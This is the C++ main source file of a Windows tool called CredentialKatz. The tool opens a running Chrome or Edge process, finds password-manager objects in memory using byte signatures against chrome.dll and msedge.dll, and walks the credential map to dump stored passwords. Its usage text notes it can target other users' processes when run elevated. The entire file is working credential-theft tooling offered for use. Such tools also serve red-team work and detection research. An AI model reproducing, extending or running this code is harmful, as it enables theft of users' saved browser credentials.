#include <stdio.h>
#include <Windows.h>
#include <shlwapi.h>

#include "Helper.h"
#include "Process.h"
#include "Memory.h"

void banner() { //This is important
    printf("  _____              _            _   _       _ _  __     _       \n");
    printf(" / ____|            | |          | | (_)     | | |/ /    | |      \n");
    printf("| |     _ __ ___  __| | ___ _ __ | |_ _  __ _| | ' / __ _| |_ ____\n");
    printf("| |    | '__/ _ \\/ _` |/ _ \\ '_ \\| __| |/ _` | |  < / _` | __|_  /\n");
    printf("| |____| | |  __/ (_| |  __/ | | | |_| | (_| | | . \\ (_| | |_ / / \n");
    printf(" \\_____|_|  \\___|\\__,_|\\___|_| |_|\\__|_|\\__,_|_|_|\\_\\__,_|\\__/___|\n");
    printf("By Meckazin                                  github.com / Meckazin \n");
};

void usage() {
    printf("Help!\n\n");
    printf("Examples:\n");
    printf(".\\CredentialKatz.exe\n");
    printf("    By default targets first available Chrome process\n");
    printf(".\\CredentialKatz.exe /edge\n");
    printf("    Targets first available Edge process\n");
    printf(".\\CredentialKatz.exe /pid:<pid>\n");
    printf("    Attempts to target given pid, expecting it to be Chrome\n");
    printf(".\\CredentialKatz.exe /edge /pid:<pid>\n");
    printf("    Target the specified Edge process\n");
    printf("\n");
    printf("Flags:\n");
    printf("    /edge       Target current user Edge process\n");
    printf("    /pid        Attempt to dump given pid, for example, someone else's if running elevated\n");
    printf("    /list       List targettable processes, use with /edge to list Edge processes\n");
    printf("    /help       This what you just did! -h works as well\n");
}

#pragma comment(lib,"shlwapi.lib")
int main(int argc, char* argv[]) {
    banner();
	printf("Don't use your cat's name as a password!\n\n");

#ifndef _WIN64
    printf("[-] 32bit version is not currently supported.\n");
    return 1;
#endif // !_WIN64

    Browser targetBrowser = Chrome;
    BOOL ProcessList = FALSE;
    DWORD pid = 0;

    //Jump over the program name
    for (size_t i = 1; i < argc; i++)
    {
        if (StrStrIA(argv[i], "pid:") != NULL)
        {
            //Split and take pid
            const char* colonPos = strchr(argv[i], ':');
            size_t pidLen = strlen(colonPos + 1);
            char* remainder = new char[pidLen + 1];
            strcpy_s(remainder, pidLen + 1, colonPos + 1);
            if (sscanf_s(remainder, "%lu", &pid) == 0) {
                printf("[-] Failed to parse command line argument /pid!");
                return 1;
            }
        }
        if (StrStrIA(argv[i], "edge") != NULL)
            targetBrowser = Msedge;
        if (StrStrIA(argv[i], "webview") != NULL)
            targetBrowser = Msedgewebview2;
        if (StrStrIA(argv[i], "list") != NULL)
            ProcessList = TRUE;
        if (StrStrIA(argv[i], "help") != NULL || StrStrIA(argv[i], "-h") != NULL) {
            usage();
            return 0;
        }
    }

    HANDLE hChrome = NULL;

    LPCWSTR processName;
    LPCWSTR dllName;
    size_t szPattern = 0;
    //0xAA is a wild card that matches any byte
    //Pattern is the implementation of the function chrome.dll!password_manager::PasswordReuseDetectorImpl::~PasswordReuseDetectorImpl(void)
    //We use that to find the contents of Virtual Function Pointer struct (__vfptr)
    //Each instance of PasswordReuseDetectorImpl comes with one
    szPattern = 144;
    BYTE* pattern;
    
    switch (targetBrowser)
    {
        case Chrome:
            printf("[*] Targeting Chrome\n");
            processName = L"chrome.exe";
            dllName = L"chrome.dll";
            pattern = new BYTE[144]{
                0x56, 0x57, 0x48, 0x83, 0xEC, 0x28, 0x89, 0xD7, 0x48, 0x89, 0xCE, 0xE8, 0xF0, 0xAA, 0xAA, 0xFF, 
                0x85, 0xFF, 0x74, 0x08, 0x48, 0x89, 0xF1, 0xE8, 0xAA, 0xAA, 0xAA, 0x01, 0x48, 0x89, 0xF0, 0x48, 
                0x83, 0xC4, 0x28, 0x5F, 0x5E, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 
                0x56, 0x57, 0x53, 0x48, 0x83, 0xEC, 0x20, 0x48, 0x89, 0xD7, 0x48, 0x89, 0xCE, 0x48, 0xBB, 0x00, 
                0x00, 0x00, 0x00, 0xFC, 0xFF, 0xFF, 0xFF, 0x48, 0x8B, 0x49, 0x18, 0x48, 0x89, 0xC8, 0x48, 0x21, 
                0xD8, 0x48, 0x3B, 0x05, 0xAA, 0xAA, 0xAA, 0x0A, 0x74, 0x34, 0x48, 0x21, 0xFB, 0x48, 0x3B, 0x1D, 
                0xAA, 0xAA, 0xAA, 0x0A, 0x75, 0x08, 0x48, 0x89, 0xF9, 0xE8, 0xAA, 0xAA, 0xAA, 0x00, 0x48, 0x89, 
                0x7E, 0x18, 0xB9, 0x90, 0x00, 0x00, 0x00, 0x48, 0x03, 0x4E, 0x10, 0x48, 0x83, 0xC6, 0x08, 0x48, 
                0x89, 0xF2, 0x48, 0x83, 0xC4, 0x20, 0x5B, 0x5F, 0x5E, 0xE9, 0xAA, 0xAA, 0xAA, 0xFE, 0xE8, 0xAA
            };
            break;
        case Msedge:
            printf("[*] Targeting Edge\n");
            processName = L"msedge.exe";
            dllName = L"msedge.dll";
            pattern = new BYTE[144]{
                0x56, 0x57, 0x48, 0x83, 0xEC, 0x28, 0x89, 0xD7, 0x48, 0x89, 0xCE, 0xE8, 0xAA, 0xAA, 0xAA, 0xF7, 
                0x85, 0xFF, 0x74, 0x08, 0x48, 0x89, 0xF1, 0xE8, 0x04, 0xAA, 0xAA, 0xF8, 0x48, 0x89, 0xF0, 0x48, 
                0x83, 0xC4, 0x28, 0x5F, 0x5E, 0xC3, 0x56, 0x48, 0x83, 0xEC, 0x20, 0x48, 0x89, 0xCE, 0x8A, 0x41, 
                0x48, 0x3A, 0x42, 0x48, 0x75, 0x11, 0x84, 0xC0, 0x74, 0x22, 0x48, 0x89, 0xF1, 0x48, 0x83, 0xC4, 
                0x20, 0x5E, 0xE9, 0xAA, 0xAA, 0xAA, 0xFD, 0x84, 0xC0, 0x75, 0x17, 0x48, 0x85, 0xF6, 0x74, 0x20, 
                0x48, 0x89, 0xF1, 0xE8, 0xAA, 0xAA, 0xAA, 0xFD, 0xC6, 0x46, 0x48, 0x01, 0x48, 0x83, 0xC4, 0x20, 
                0x5E, 0xC3, 0x48, 0x89, 0xF1, 0xE8, 0x76, 0xAA, 0xAA, 0xF9, 0xC6, 0x46, 0x48, 0x00, 0xEB, 0xEC, 
                0x48, 0x8D, 0x0D, 0xAA, 0xAA, 0xAA, 0x02, 0x48, 0x8D, 0x15, 0xAA, 0xAA, 0xAA, 0x02, 0xE8, 0xAA, 
                0xAA, 0xAA, 0xAA, 0xCC, 0x56, 0x48, 0x83, 0xEC, 0x20, 0x48, 0x89, 0xCE, 0x80, 0x79, 0x48, 0x00
            };
            break;
        case Msedgewebview2:
            printf("[*] Targeting Msedgewebview2\n");
            processName = L"msedgewebview2.exe";
            dllName = L"msedge.dll";
            pattern = new BYTE[144]{
                //not supported
            };
            printf("[-] msedgewebview2 is not currently supported!\n");
            return 1;
            break;
        default:
            printf("[-] Invalid target browser!\n");
            CloseHandle(hChrome);
            return 1;
            break;
    }

    if (ProcessList)
    {
        printf("[*] Listing targetable processes\n");
        FindAllSuitableProcesses(processName);
        printf("[+] Done\n");
        return 0;
    }

    if (pid != 0)
    {
        if (!GetProcessHandle(pid, &hChrome))
        {
            printf("[-] Failed to get process handle to PID: %lu\n", pid);
            return 1;
        }
        if (!GetProcessName(hChrome, processName))
        {
            printf("[-] Failed to get process handle to PID: %lu\n", pid);
            return 1;
        }

        if (IsWow64(hChrome))
        {
            printf("[-] Target process is 32bit. Only 64bit browsers are supported!\n");
            CloseHandle(hChrome);
            return 1;
        }

        printf("[*] Targeting process: %ls on PID: %lu\n", processName, pid);
    }

    //If pid was not given, now we go and find the process and handle
    if (pid == 0)
    {
        if (!FindCorrectProcessPID(processName, &pid, &hChrome) || hChrome == NULL)
        {
            printf("[-] Failed to find right process\n");
            return 1;
        }

        if (IsWow64(hChrome))
        {
            printf("[-] Target process is 32bit. Only 64bit browsers are supported!\n");
            CloseHandle(hChrome);
            return 1;
        }
    }
#ifdef _DEBUG
    wprintf(TEXT("[*] Targeting process PID: %d\n"), pid);
#endif


    uintptr_t baseAddress = 0;
    DWORD moduleSize = 0;
    if (!GetRemoteModuleBaseAddress(hChrome, dllName, baseAddress, &moduleSize))
    {
        printf("[-] Failed to find %ls base address!\n", dllName);
        CloseHandle(hChrome);
        return 1;
    }

    uintptr_t resultAddress = 0;
    if (!FindDllPattern(hChrome, pattern, szPattern, baseAddress, moduleSize, resultAddress)) {
        printf("[-] Failed to find the first pattern!\n");
        CloseHandle(hChrome);
        return 1;
    }

#ifdef _DEBUG
    wprintf(TEXT("[*] Found first pattern on 0x%p\n"), (void*)resultAddress);
#endif
    BYTE secondPattern[sizeof(uintptr_t)];
    ConvertToByteArray(resultAddress, secondPattern, sizeof(uintptr_t));

    if (!FindDllPattern(hChrome, secondPattern, sizeof(uintptr_t), baseAddress, moduleSize, resultAddress)) {
        printf("[-] Failed to find the second pattern!\n");
        CloseHandle(hChrome);
        return 1;
    }
#ifdef _DEBUG
    wprintf(TEXT("[*] Found second pattern on 0x%p\n"), (void*)resultAddress);
#endif
    BYTE thirdPattern[sizeof(uintptr_t)];
    ConvertToByteArray(resultAddress, thirdPattern, sizeof(uintptr_t));

    uintptr_t* PasswordReuseDetectorInstances = (uintptr_t*)malloc(sizeof(uintptr_t) * 100); //There is no person with computer RAM enough to run more than 100 chrome instances :D
    size_t szPasswordReuseDetectorInstances = 0;
    if (PasswordReuseDetectorInstances == NULL || !FindPattern(hChrome, thirdPattern, sizeof(uintptr_t), PasswordReuseDetectorInstances, szPasswordReuseDetectorInstances)) {
        printf("[-] Failed to find the third pattern!\n");
        CloseHandle(hChrome);
        free(PasswordReuseDetectorInstances);
        return 1;
    }
#ifdef _DEBUG
    wprintf(TEXT("[*] Found %zu instances of CredentialMap!\n"), szPasswordReuseDetectorInstances);

    for (size_t i = 0; i < szPasswordReuseDetectorInstances; i++)
        wprintf(TEXT("[*] Found PasswordReuseDetector on 0x%p\n"), (void*)PasswordReuseDetectorInstances[i]);
#endif
    //There should really be one instance, but might be more if more windows are created?
    for (size_t i = 0; i < szPasswordReuseDetectorInstances; i++)
    {
        if (szPasswordReuseDetectorInstances == NULL || PasswordReuseDetectorInstances[i] == NULL)
            break;
        
        uintptr_t CredentialMapOffset = 0; //Offset to passwords_with_matching_reused_credentials_ 0x20 for my own debug build
        CredentialMapOffset += PasswordReuseDetectorInstances[i] + sizeof(uintptr_t); //Include the length of the result address as well
#ifdef _DEBUG
        wprintf(TEXT("[*] CredentialMap should be found in address 0x%p\n"), (void*)CredentialMapOffset);
#endif
        WalkCredentialMap(hChrome, CredentialMapOffset);
    }

    CloseHandle(hChrome);
    free(PasswordReuseDetectorInstances);

    printf("\n[+] Done\n");
    return 0;
}